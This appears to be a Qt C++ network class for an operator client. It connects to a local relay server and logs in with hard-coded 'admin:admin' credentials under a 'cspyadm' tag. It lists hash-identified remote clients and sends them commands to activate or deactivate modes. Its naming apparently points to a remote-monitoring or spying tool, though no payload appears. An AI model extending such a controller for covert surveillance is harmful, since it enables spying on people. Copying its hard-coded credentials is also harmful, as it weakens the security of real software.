#include "network.h"

Network::Network(QObject *parent):
    QObject(parent)
{
    socket_ = new QTcpSocket(this);
    QObject::connect(socket_, SIGNAL(readyRead()),
                     this, SLOT(onDataReceived()));

    QObject::connect(socket_, SIGNAL(connected()),
                     this,SLOT(onConnected()));
}

void Network::connectToServer()
{
    if (socket_->state()!=QTcpSocket::UnconnectedState)
        return;

    socket_->connectToHost(QHostAddress("127.0.0.1"),1235);
                                    // TODO: request from user
}

void Network::onDataReceived()
{
    qDebug("onDataReceived()");
    QByteArray data=socket_->readAll();
    parseData(data);
}

void Network::parseData(const QByteArray &data)
{
    parseList(data);
    parseResponse(data);
    parsePing(data);
}

bool Network::parseList(const QByteArray &data)
{
    QRegExp re("l:(.+):");
    if (re.indexIn(data) == -1)
        return false;

    qDebug("parseList()");

    QStringList clients = re.cap(1).split(";");

    clients_.clear();
    for (auto i = clients.begin();(i + 1) < clients.end(); i += 2)
    {
        qint32 id = (*i).toInt();
        QString hash = *(i + 1);
        if (hash.size() != 32) continue;
        Client *client = new Client(this, hash, id);
        clients_.insert(id, client);
    }
    emit listUpdated();
    return true;
}

bool Network::parsePing(const QByteArray &data)
{
    QRegExp re("p:");
    if (re.indexIn(data) == -1)
        return false;

    qDebug("parsePing()");

    socket_->write("p:");
    return true;
}

bool Network::parseResponse(const QByteArray &data)
{
    QRegExp re("f:(\\d+):(\\d+):(.+)");

    if (re.indexIn(data) == -1)
        return false;

    qDebug() << "parseResponse():";

    qint32 from=re.cap(1).toInt();
    qint32 len=re.cap(2).toInt();
    QByteArray dataTwo=re.cap(3).toUtf8();

    dataTwo=dataTwo.left(len);

    parseProtoTwo(from,dataTwo);
    return true;
}

void Network::parseProtoTwo(qint32 from, const QByteArray &data)
{
    qDebug() << "parseProtoTwo()";
    parseMessage(from, data);
}

bool Network::parseMessage(qint32 from, const QByteArray &data)
{
    QRegExp re("(\\d+):(\\d+):(.+)");

    if (re.indexIn(data)==-1)
        return false;

    ProtocolMode mode=ProtocolMode(re.cap(1).toInt());
    qint32 len=re.cap(2).toInt();

    income_.mode=mode;
    income_.from=from;
    income_.data=re.cap(3).left(len).toUtf8();
    emit dataIncome();

    return true;
}

void Network::onConnected()
{
    socket_->write("cspyadm:1:admin:admin:");
    socket_->write("l:");
    socket_->flush();
}

const Clients& Network::getClients() const
{
    return clients_;
}

QString Network::getClientName(qint32 id) const
{
    auto client=clients_.find(id);
    if (client==clients_.end())
        return "";
    return client.value()->getHash();
}

void Network::sendLevelOne(qint32 dest, const QByteArray& data)
{
    QByteArray packet;
    packet=(QString("t:%1:%2:")
            .arg(dest)
            .arg(data.size())).toLocal8Bit();
    packet+=data+':';
    socket_->write(packet);
}

void Network::sendLevelTwo(qint32 dest, ProtocolMode mode, const QByteArray& data)
{
    QByteArray packet;
    packet=(QString("%1:%2:")
            .arg(mode)
            .arg(data.size())).toLocal8Bit();
    packet+=data+':';
    sendLevelOne(dest,packet);
}

void Network::activateMode(qint32 client, ProtocolMode mode)
{
    QString cmd=QString("a:%1:").arg(mode);
    sendLevelOne(client,cmd.toLocal8Bit());
}

void Network::deactivateMode(qint32 client, ProtocolMode mode)
{
    QString cmd=QString("d:%1:").arg(mode);
    sendLevelOne(client,cmd.toLocal8Bit());
}

const Network::Income& Network::receivedData() const
{
    return income_;
}
